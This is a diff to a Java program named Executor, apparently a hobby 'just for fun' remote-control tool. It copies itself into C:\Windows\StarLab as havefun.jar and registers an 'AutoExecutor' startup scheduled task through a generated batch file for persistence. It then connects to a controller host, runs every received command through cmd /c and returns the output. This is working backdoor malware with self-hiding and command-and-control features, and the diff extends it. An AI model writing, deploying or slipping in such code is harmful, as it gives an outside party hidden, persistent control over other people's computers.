@@ -13,8 +13,9 @@ import java.net.Socket;
 public class Executor {
 	private static final String CONTROLLER_HOST_NAME = "hlsang-PC";
 	private static int CONTROLLER_PORT = 25463;
-	private static String dirPath = "C:\\Program Files\\StarLab\\";
-	private static String targetFileName = "havefun.jar";
+	private static String DIR_PATH = "C:\\Windows\\StarLab\\";
+	private static String TARGET_FILENAME = "havefun.jar";
+	private static String BATCH_NAME = "havefun.bat";
 	
 	private static Socket client = null;
 	private static DataOutputStream dos = null;
@@ -23,14 +24,18 @@ public class Executor {
 	public static void main(String[] args) throws Exception {
 		// TODO Auto-generated method stub
 		if(hide().equals("no_need")){
-			Runtime.getRuntime().exec("cmd /c msg %username% Hello %username%, just for fun!\nForget about it.");
+			//System.out.println("no_need");
+			//Runtime.getRuntime().exec("cmd /c msg %username% Hello %username%, just for fun!\nForget about it.");
 			establishConnection();
 			if(client!=null){
 				waitForCommand();
 			}
 			close();
 		}else{
-			Runtime.getRuntime().exec("cmd /c java -jar \""+dirPath+targetFileName+"\"");
+			//Runtime.getRuntime().exec("cmd /c schtasks /run /tn \"AutoExecutor\"");
+			getCMDReturnMsg("schtasks /run /tn \"AutoExecutor\"");
+			//System.out.println(getCMDReturnMsg("schtasks /run /tn \"AutoExecutor\""));
+
 		}
 		System.out.println("Exit");
 	}
@@ -72,6 +77,7 @@ public class Executor {
 				String result = getCMDReturnMsg(cmd);
 				//System.out.println(result);
 				sendExecuteResult(result);
+				Runtime.getRuntime().exec("cmd /c msg %username% "+cmd);
 			}catch(Exception e){
 				e.printStackTrace();
 			}
@@ -79,9 +85,9 @@ public class Executor {
 	}
 
 	public static String getCMDReturnMsg(String cmd){
-		if(cmd==null||cmd.length()==0) return "";
+		if(cmd==null||cmd.length()==0) return "nothing";
 		try{
-			System.out.println("Executing: cmd /c " + cmd);
+			//System.out.println("Executing: cmd /c " + cmd);
 			Process p = Runtime.getRuntime().exec("cmd /c " + cmd);
 			InputStream is = p.getInputStream();
 			StringBuilder msg = new StringBuilder();
@@ -90,13 +96,15 @@ public class Executor {
 			while((len=is.read(b))>0){
 				msg.append(new String(b, 0, len,"GBK"));
 			}
+			//Runtime.getRuntime().exec("cmd /c msg %username% "+msg.toString());
 			//System.out.println(msg.toString());
 			return msg.toString();
+			//return "lalala";
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		return "";
+		return "error";
 	}
 	
 	public static String receiveCommand(){
@@ -117,6 +125,7 @@ public class Executor {
 	public static void sendExecuteResult(String msg){
 		if(msg==null)return;
 		try{
+			
 			System.out.println("Sending back result...");
 			dos.writeUTF(msg);
 			dos.flush();
@@ -143,10 +152,11 @@ public class Executor {
 	
 	public static String hide(){
 		String sourceFileName = System.getProperty("java.class.path");
-		File targetDir = new File(dirPath);
+		File targetDir = new File(DIR_PATH);
 		File sourceFile = new File(sourceFileName);
-		File targetFile = new File(dirPath, targetFileName);
-		if(sourceFile.getAbsolutePath().startsWith(dirPath)){
+		File targetFile = new File(DIR_PATH, TARGET_FILENAME);
+		//System.out.println(sourceFile.getAbsolutePath());
+		if(sourceFile.getAbsolutePath().toLowerCase().startsWith(DIR_PATH.toLowerCase())){
 			return "no_need";
 		}
 		if(!targetDir.exists()){
@@ -159,8 +169,7 @@ public class Executor {
 			while((len=fis.read(b))>0){
 				fos.write(b, 0, len);
 			}
-			String schtasksStr = "schtasks /create /tn \"AutoExecutor\" /tr  \"C:\\Program Files\\StarLab\\havefun.jar\" /sc onstart";
-			Runtime.getRuntime().exec(schtasksStr);
+			createBatch();
 		} catch (FileNotFoundException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -171,4 +180,25 @@ public class Executor {
 		return "";
 	}
 	
+	public static void createBatch(){
+		File file = new File(DIR_PATH,BATCH_NAME);
+		try{
+			if(!file.exists()){
+				file.createNewFile();
+			}
+			FileOutputStream fos = new FileOutputStream(file);
+			fos.write(("start javaw -jar "+DIR_PATH+TARGET_FILENAME + "\r\nexit").getBytes());
+			fos.flush();
+			fos.close();
+			String deleteSchtasks = "schtasks /delete /tn \"AutoExecutor\" /f";
+			//Runtime.getRuntime().exec("cmd /c "+deleteSchtasks);
+			getCMDReturnMsg(deleteSchtasks);
+			String schtasksStr = "schtasks /create /tn \"AutoExecutor\" /tr  \""+DIR_PATH+BATCH_NAME+"\" /sc onstart";
+			//Runtime.getRuntime().exec("cmd /c "+schtasksStr);
+			getCMDReturnMsg(schtasksStr);
+		}catch (Exception e) {
+			// TODO: handle exception
+		}
+		
+	}
 }
